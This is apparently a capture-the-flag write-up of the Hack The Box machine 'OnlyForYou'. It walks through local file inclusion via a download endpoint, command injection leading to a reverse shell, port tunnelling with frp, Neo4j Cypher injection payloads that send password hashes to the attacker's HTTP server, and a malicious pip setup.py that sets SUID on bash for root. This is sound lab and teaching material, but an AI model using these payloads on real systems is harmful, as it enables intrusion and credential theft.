# medium - OnlyForYou

## User Flag

### Nmap scanning
Interesting finding, many filtered ports, probably open internally only:
```bash
z➤ sudo nmap -n -Pn -sV -O -T4 onlyforyou.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 08:35 -04
Nmap scan report for onlyforyou.htb (10.10.11.210)
Host is up (0.13s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http         nginx 1.18.0 (Ubuntu)
1234/tcp  filtered hotline
1494/tcp  filtered citrix-ica
2381/tcp  filtered compaq-https
4446/tcp  filtered n1-fwp
5862/tcp  filtered unknown
7435/tcp  filtered unknown
10243/tcp filtered unknown
10629/tcp filtered unknown
11111/tcp filtered vce
17877/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/11%OT=22%CT=1%CU=41064%PV=Y%DS=2%DC=I%G=Y%TM=64D62B3
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds
```

### Web recognition
Here we go, we another redirection and we have to add only4you.htb to `/etc/hosts`:
```bash
~z➤ curl -I -L onlyforyou.htb
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 11 Aug 2023 12:37:52 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://only4you.htb/

curl: (6) Could not resolve host: only4you.htb
```

Regular web page at a first glance:
{{< limg "/i/2023-08-11_08-38.png" "initial web page" >}}

Ok, so inspecting a little bit the html source code, I found this http://beta.only4you.htb :
```bash
~z➤ curl -s -L only4you.htb  | ag href | sort -u
...
...
  <link href="../static/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="../static/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="../static/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
                  We have some beta products to test. You can check it <a href="http://beta.only4you.htb">here</a>
```

And now we have something:
{{< limg "/i/2023-08-11_08-47.png" "initial web page" >}}

Ok, now we have some pages to have some fun:
```bash
~z➤ curl -s -L beta.only4you.htb | ag href
...
<a class="nav-link" href="/resize">resize</a>
<a class="nav-link" href="/convert">convert</a>
<a href="/source" class="btn btn-primary my-2">Source Code</a>
```

I'm downloading the source code, I reviewied `/convert` and `/resize` html source code, nothing interesting.
{{< limg "/i/2023-08-11_08-53.png" "" >}}

Ok, there are these two .py files: 
- app.py contains a Flask service with multiple routing http endpoints
- tool.py converts and resizes an image file

We started wrong here, check these app.py and too.py image validations by filename extension instead of metadata header file:
{{< limg "/i/2023-08-11_09-03.png" "" >}}
{{< limg "/i/2023-08-11_09-06.png" "" >}}

Notice these libs are being used and might be vulnerables somehow:
- `from PIL import Image`
- `from werkzeug.utils import secure_filename`

### Exploiting `/download` http endpoint

Let's exploit this url endpoint.

So after uploading an image to be resized I got multiple images to download:

{{< limg "/i/2023-08-16_20-46.png" "Multiple files to download" >}}

By using Burpsuite (I used to hate this tool) I found that this `/download` http path has an LFI vuln, the `image=` parameter can be modified and we can download files from the server, you also saw the previous `app.py` python file was just validating the user don't send anything starting with `..` and `../`, but not something like `/etc/passwd`:

```bash
curl -i -s -k -X $'POST' \
  -H $'Host: beta.only4you.htb' \
  -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0' \
  -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
  -H $'Accept-Language: en-US,en;q=0.5' \
  -H $'Accept-Encoding: gzip, deflate' \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  -H $'Content-Length: 17' \
  -H $'Origin: http://beta.only4you.htb' \
  -H $'Connection: close' \
  -H $'Referer: http://beta.only4you.htb/list' \
  -H $'Upgrade-Insecure-Requests: 1' \
  -H $'Sec-GPC: 1' \
  --data-binary $'image=/etc/passwd' \
  $'http://beta.only4you.htb/download'


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 17 Aug 2023 01:00:20 GMT
Content-Type: application/octet-stream
Content-Length: 2079
Connection: close
Content-Disposition: attachment; filename=passwd
Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
Cache-Control: no-cache
ETag: "1680178340.2049809-2079-393413677"

root:x:0:0:root:/root:/bin/bash
...
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

Ok, we've got some names from that like `john` and `dev`.

Here we see, we have both vhosts on nginx, notice the path `/var/www/beta.only4you.htb`:
```bash
curl -s -k -X $'POST' \
  -H $'Host: beta.only4you.htb' \
  -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0' \
  -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
  -H $'Accept-Language: en-US,en;q=0.5' \
  -H $'Accept-Encoding: gzip, deflate' \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  -H $'Origin: http://beta.only4you.htb' \
  -H $'Connection: close' \
  -H $'Referer: http://beta.only4you.htb/list' \
  -H $'Upgrade-Insecure-Requests: 1' \
  -H $'Sec-GPC: 1' \
  --data-binary $'image=/etc/nginx/sites-enabled/default' \
  $'http://beta.only4you.htb/download'


server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
        listen 80;
        server_name only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
        }
}

server {
        listen 80;
        server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

I'm able to read only4you.htb py files:
```bash
curl -s -k -X $'POST' \
  -H $'Host: beta.only4you.htb' \
  ...
  ...
  --data-binary $'image=/var/www/only4you.htb/app.py' \
  $'http://beta.only4you.htb/download'

from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')
...
...
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

Notice that `form` py library, let's read the code:
```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
                return 0
        else:
                domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                output = result.stdout.decode('utf-8')
                if "v=spf1" not in output:
                        return 1
                else:
                        domains = []
                        ips = []
                        if "include:" in output:
                                dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                dms.pop(0)
                                for domain in dms:
                                        domains.append(domain)
                                while True:
                                        for domain in domains:
                                                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                                                output = result.stdout.decode('utf-8')
                                                if "include:" in output:
                                                        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                                        domains.clear()
                                                        for domain in dms:
                                                                domains.append(domain)
                                                elif "ip4:" in output:
                                                        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                                        ipaddresses.pop(0)
                                                        for i in ipaddresses:
                                                                ips.append(i)
                                                else:
                                                        pass
                                        break
                        elif "ip4" in output:
                                ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                ipaddresses.pop(0)
                                for i in ipaddresses:
                                        ips.append(i)
                        else:
                                return 1
                for i in ips:
                        if ip == i:
                                return 2
                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
                                return 2
                        else:
                                return 1

def sendmessage(email, subject, message, ip):
        status = issecure(email, ip)
        if status == 2:
                msg = EmailMessage()
                msg['From'] = f'{email}'
                msg['To'] = 'info@only4you.htb'
                msg['Subject'] = f'{subject}'
                msg['Message'] = f'{message}'

                smtp = smtplib.SMTP(host='localhost', port=25)
                smtp.send_message(msg)
                smtp.quit()
                return status
        elif status == 1:
                return status
        else:
                return status
```

Notice the function `issecure` is vulnerable to RCE, because of this line `result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)`. You will see that app.py calls the function `sendmessage` from form.py script, and `sendmessage()` calls `issecure(email, ip)`, so `email` field is vulnerable to injection.

So I tried to curl my localhost and it succeded. Now getting a rev shell:
```bash
z➤ nc -lvnp 55555
Connection from 10.10.11.210:48762
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@only4you:~/only4you.htb$ pwd
pwd
/var/www/only4you.htb
```

#### Exposing internal services
```bash
www-data@only4you:~/only4you.htb$ netstat -tulpn | grep 127.0.0.1
netstat -tulpn | grep 127.0.0.1
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -
```

We see some interal ports LISTENing, let's expose them and see what they have are running. For this matter I used this popular tool https://github.com/fatedier/frp

It helps to rapidly expose local servers to ouside in different ways. It uses two programs one for the internal server and one for the client.

I will just start the client app on my workstation: 
```bash
z➤ ./frps -p 7000 --bind_addr "0.0.0.0"
2023/08/16 22:03:14 [I] [root.go:206] frps uses command line arguments for config
2023/08/16 22:03:14 [I] [service.go:206] frps tcp listen on 0.0.0.0:7000
2023/08/16 22:03:14 [I] [root.go:213] frps started successfully
```

Now I will run the "exposer" app on the server from user `www-data`, it requires a config file `frpc.ini`:
```text
[common]
server_addr = 10.10.14.3
server_port = 7000

[aa]
type = tcp
local_ip = 127.0.0.1
local_port = 3000
remote_port = 3000

[bb]
type = tcp
local_ip = 127.0.0.1
local_port = 8001
remote_port = 8001

[cc]
type = tcp
local_ip = 127.0.0.1
local_port = 7474
remote_port = 7474
```

Now I can run the app:
```bash
www-data@only4you:~/only4you.htb$ nohup ./frpc -c frpc001.ini &
nohup ./frpc -c frpc001.ini &
[1] 3558
www-data@only4you:~/only4you.htb$ 2023/08/17 02:14:45 [I] [root.go:220] start frpc service for config file [frpc001.ini]
2023/08/17 02:14:45 [I] [service.go:301] [99ab7b3792eb61fe] login to server success, get run id [99ab7b3792eb61fe]
2023/08/17 02:14:45 [I] [proxy_manager.go:150] [99ab7b3792eb61fe] proxy added: [aa bb cc]
2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [aa] start proxy success
2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [bb] start proxy success
2023/08/17 02:14:45 [I] [control.go:172] [99ab7b3792eb61fe] [cc] start proxy success
```

Now we can access multiple pages:

{{< limg "/i/2023-08-16_22-16.png" "Login app" >}}
{{< limg "/i/2023-08-16_22-17.png" "Git repos hosting" >}}
{{< limg "/i/2023-08-16_22-17_1.png" "Neo4j dashboard" >}}

So the webapp running on port `8001` has a default user/password: `admin:admin`. In there we can see a search page which is vulnerable to SQLi for Neo4j:
{{< limg "/i/2023-08-16_22-27.png" "SQLi" >}}
We can get the SQLi from https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
```sql
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```

Where `http://10.0.2.4:8000` should be a dummy server we run, so we can see requests and their params. 
```bash
~/tmp➤ python -m http.server 6666
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
10.10.11.210 - - [16/Aug/2023 22:25:44] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [16/Aug/2023 22:25:44] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```

Getting all labels from db: `1' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.3:6666/?label='+label as l RETURN 0 as _0 //`
```bash
10.10.11.210 - - [16/Aug/2023 22:39:13] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:14] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:14] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:14] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:15] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:15] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:15] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:15] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:16] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:39:16] "GET /?label=employee HTTP/1.1" 200 -
```

Dumping data from user label db: `1' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.3:6666/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //`
```bash
10.10.11.210 - - [16/Aug/2023 22:40:34] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:35] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:35] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:35] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:36] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:36] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:36] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:36] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:37] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:37] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:37] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:38] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [16/Aug/2023 22:40:38] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
```

Looking into crackstation to see if there is something cracked there already:
{{< limg "/i/2023-08-16_22-42.png" "Crackstation" >}}

```bash
john@only4you:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
john@only4you:~$ ls
user.txt
john@only4you:~$
```

## Root Flag

We have to do something with `pip` to escalate:
```bash
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

#### Building a malicious pip package

So lets create a malicious setup.py and then we build our pip package, we can see the reference here: https://github.com/wunderwuzzi23/this_is_fine_wuzzi
```python
import os
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
    print("Hello, p0wnd!")
    os.system("chmod +s /bin/bash")
class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "oops",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Now we build the pip package:
```bash
~/tmp/dummy➤ python -m build
* Creating virtualenv isolated environment...
* Installing packages in isolated environment... (setuptools >= 40.8.0, wheel)
* Getting build dependencies for sdist...
running egg_info
Hello, p0wnd!
chmod: changing permissions of '/bin/bash': Operation not permitted
...
...
...
adding 'oops-0.0.1.dist-info/WHEEL'
adding 'oops-0.0.1.dist-info/top_level.txt'
adding 'oops-0.0.1.dist-info/RECORD'
removing build/bdist.linux-x86_64/wheel
Successfully built oops-0.0.1.tar.gz and oops-0.0.1-py3-none-any.whl
```

The malicious pip package can only be installed via `http://127.0.0.1:3000`, that is the Gogs git internal service we saw before, so we just create a git repository (using same ssh creds in Gogs web page) and then upload the resultant malicious pip package:
{{< limg "/i/2023-08-16_22-56.png" "Uploading vulnerable pip package" >}}

We are root now:
```bash
john@only4you:/etc/nginx/sites-enabled$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz (847 bytes)
  Saved ./oops-0.0.1.tar.gz
Successfully downloaded oops
john@only4you:/etc/nginx/sites-enabled$ /bin/bash -p
bash-5.0# id
uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
bash-5.0#
```

## TODOs

- Review in depth neo4j cypher sqli

Thanks 4 reading!
